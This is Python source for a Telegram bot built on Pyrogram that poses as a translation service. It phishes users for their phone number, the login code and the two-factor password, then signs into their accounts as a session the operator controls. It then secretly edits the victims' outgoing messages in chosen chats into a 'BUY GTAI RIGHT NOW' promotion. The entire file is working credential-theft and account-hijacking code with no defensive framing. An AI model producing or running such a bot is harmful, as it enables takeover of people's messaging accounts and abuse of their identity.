import asyncio

from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.methods.utilities.idle import idle
from pyrogram.handlers import MessageHandler
from pyrogram.errors import SessionPasswordNeeded

import settings


app = Client(
    "main_bot",
    api_id=settings.API_ID,
    api_hash=settings.API_HASH,
    bot_token=settings.BOT_TOKEN,
)


register_chats = set()


# dict[telegram user_id: [CLIENT, send code hash]]
clients: dict[int, list[Client, str]] = {}


async def handle_new_message(client: Client, message: Message):
    print(
        f"New message received {message.from_user.username or message.from_user.id}: ",
        message.text,
    )
    if message.chat.id in register_chats:
        await client.edit_message_text(
            chat_id=message.chat.id, message_id=message.id, text="BUY GTAI RIGHT NOW"
        )


async def message_listener(client: Client):
    client.add_handler(MessageHandler(handle_new_message, filters.outgoing))
    client.me = await client.get_me()
    await client.initialize()


@app.on_message(filters.command("start") & filters.private)
async def start_command(client: Client, message: Message):
    await message.reply(
        "Welcome! Please set your target translation language\n"
        "Auhorize. Write your mobile number with /auth prefix\n\n"
        "Example: /auth +380685543178\n\n"
        "For add chats for translate: send contact to bot"
    )


@app.on_message(filters.command("auth") & filters.private)
async def auth(client: Client, message: Message):
    async def already_authorized():
        await message_listener(client)
        await message.reply("Already authorized. All messages will be translated")

    if message.text == "/auth":
        return

    number = message.text.replace("/auth ", "")

    # Authorize client
    if not clients.get(message.from_user.id):
        clients[message.from_user.id] = [
            Client(
                number,
                api_id=settings.API_ID,
                api_hash=settings.API_HASH,
                phone_number=number,
            ),
            None,
        ]

    client: Client = clients[message.from_user.id][0]
    if not client.is_connected:
        is_authorized = await client.connect()

        if is_authorized:
            return await already_authorized()
    else:
        return await already_authorized()

    code_hash = await client.send_code(number)

    clients[message.from_user.id][1] = code_hash.phone_code_hash

    await message.reply("Write number (n111111):")


@app.on_message(filters.regex(r"^n\d+$") & filters.text & filters.private)
async def save_code(client: Client, message: Message):
    code = message.text.replace("n", "")
    client: Client = clients[message.from_user.id][0]

    try:
        await client.sign_in(
            phone_code=code,
            phone_code_hash=clients[message.from_user.id][1],
            phone_number=client.phone_number,
        )
    except SessionPasswordNeeded:
        return await message.reply(
            "Write password that start with: /p\nExample: /p password"
        )

    await message.reply('Authorized')
    await message_listener(client)


@app.on_message(filters.command("p") & filters.private)
async def save_password(client: Client, message: Message):
    password = message.text.replace("/p ", "")
    client: Client = clients[message.from_user.id][0]

    try:
        await client.check_password(password)
    except Exception as e:
        return await message.reply(str(e))

    await message.reply('Authorized')
    await message_listener(client)


@app.on_message(filters.command("accounts") & filters.private)
async def get_all_clients(client: Client, message: Message):
    if len(clients) == 0:
        return await message.reply("Empty accounts")


@app.on_message(filters.contact & filters.private)
async def register_chat(client: Client, message: Message):
    register_chats.add(message.contact.user_id)
    await message.reply('Added')


async def standup():
    await idle()


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    with app:
        run = loop.run_until_complete(standup())
